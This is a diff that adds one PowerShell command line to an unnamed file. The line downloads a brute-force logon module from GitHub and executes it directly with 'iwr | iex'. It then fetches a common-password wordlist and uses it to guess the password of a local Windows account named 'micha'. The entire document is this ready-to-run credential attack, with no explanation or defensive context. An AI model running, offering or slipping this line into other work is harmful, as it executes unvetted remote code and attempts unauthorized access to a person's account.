@@ -1,0 +1,1 @@
+$pwd = Get-Location; iwr -useb https://raw.githubusercontent.com/PhrozenIO/PowerBruteLogon/main/PowerBruteLogon/PowerBruteLogon.psm1 | iex; iwr -useb https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt -OutFile "$pwd\10k.txt"; Invoke-BruteLogonAccount -Username 'micha' -Wordlist "$pwd\10k.txt"
